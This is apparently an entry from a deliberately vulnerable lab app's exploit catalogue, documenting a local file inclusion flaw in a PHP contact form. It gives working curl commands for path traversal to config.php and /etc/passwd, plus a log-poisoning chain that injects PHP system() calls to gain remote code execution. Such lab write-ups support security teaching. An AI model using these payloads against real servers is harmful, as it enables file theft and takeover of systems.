# 11 — Local file inclusion via the contact form selector

- **OWASP Top 10 (2021):** A01:2021 – Broken Access Control
- **Severity:** Critical
- **Difficulty:** Easy

## Where

`web/contact.php:13,15` — `GET /contact.php?form=<name>` (unauthenticated):

```php
$form = isset($_GET['form']) ? $_GET['form'] : 'contactform.php';
...
include("forms/" . $form);
```

## How it works (root cause)

The `form` parameter selects which PHP file is `include`d from the
`web/forms/` directory, with no whitelist. Because PHP's `include` accepts
`../` traversal and (with `allow_url_include=On`) even URL wrappers, the
parameter can be used to include **any readable file** on the server and
execute the PHP inside it.

## Exploitation steps

1. Include/execute a PHP file outside the intended directory. Because the
   include prefix is `forms/`, one `../` reaches `web/`:

   ```bash
   curl -s 'http://localhost:8080/contact.php?form=../includes/config.php'
   ```

   This re-executes `config.php` and produces a PHP warning such as
   `Constant API_TOKEN_KEY already defined`, proving the include. (For the
   raw source of `config.php`, use the image path traversal in 10.)

2. Read a system file (no PHP inside, so the raw text is printed). From
   `web/`, seven `..` segments reach `/`:

   ```bash
   curl -s 'http://localhost:8080/contact.php?form=../../../../../../../etc/passwd'
   ```

3. **RCE via log poisoning** — include a visit log that contains attacker
   PHP (see 12 for the full chain):

   ```bash
   # 1) plant PHP in a failed-login log entry
   curl -s --data-urlencode "username=<?php system('id > /tmp/osede_lfi_rce_pwned'); ?>" \
        --data-urlencode 'password=x' http://localhost:8080/login.php
   # 2) find the log path (PHP time, UTC) and include it
   curl -s 'http://localhost:8080/contact.php?form=../logs/visits-<UTC-date>-H.log'
   ```

## Working PoC (verified)

```
GET /contact.php?form=../includes/config.php
```

re-includes `config.php` and emits a `Constant ... already defined` PHP
warning, proving arbitrary PHP file inclusion.

```
GET /contact.php?form=../../../../../../../etc/passwd
```

prints `/etc/passwd`.

The log-poisoning variant produced `/tmp/osede_lfi_rce_pwned`
(`uid=1000(user)...`) — confirmed RCE.

## Expected result / verification

- Arbitrary PHP files can be included/executed (e.g. `config.php`).
- Arbitrary non-PHP file contents are returned.
- With 12, arbitrary PHP code execution as the PHP-FPM user.

## Attack chain

```
LFI
  → include includes/config.php → API_TOKEN_KEY
      → forged admin token (18) → uplist command injection (17) → RCE
  → include a poisoned visit log (12) → RCE directly
```

## Notes

- `conf/php.ini` has `allow_url_include=On`, which also enables
  `form=php://filter/...` and remote-wrapper variants; the `../` variant is
  the simplest.
- This is the intended low-difficulty RCE entry point.
